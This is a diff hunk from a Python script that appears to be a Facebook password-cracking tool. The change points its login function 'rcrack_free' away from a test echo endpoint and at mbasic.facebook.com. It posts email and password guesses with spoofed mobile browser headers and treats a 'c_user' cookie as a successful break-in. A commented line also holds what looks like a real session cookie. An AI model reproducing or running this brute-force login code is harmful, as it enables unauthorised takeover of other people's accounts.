@@ -683,16 +683,21 @@ def rcrack_free(idf,pwv):
 			"email":idf,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'Origin': 'http://fiddle.jshell.net',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.8',
-    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
-    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'Accept': '*/*',
-    'Referer': 'http://fiddle.jshell.net/_display/',
-    'X-Requested-With': 'XMLHttpRequest',
-    'Connection': 'keep-alive',}
-			lo = session.post('http://fiddle.jshell.net/echo/html/',data=log_data,headers=header_freefb).text
+			header_freefb = {'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9,ar-MA;q=0.8,ar;q=0.7,ur-PK;q=0.6,ur;q=0.5',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=bR75Yzisy1QuDaGGX_e-FgXc; sb=bR75Y8BwrhbSz_BwBS9CwZsR; wd=360x663; fr=0iXGZRFNCaPppgABU..Bj-3Ae.69.AAA.0.0.Bj_0G2.AWV1R80Sj6w',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0',}
+			lo = session.post('https://mbasic.facebook.com/',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
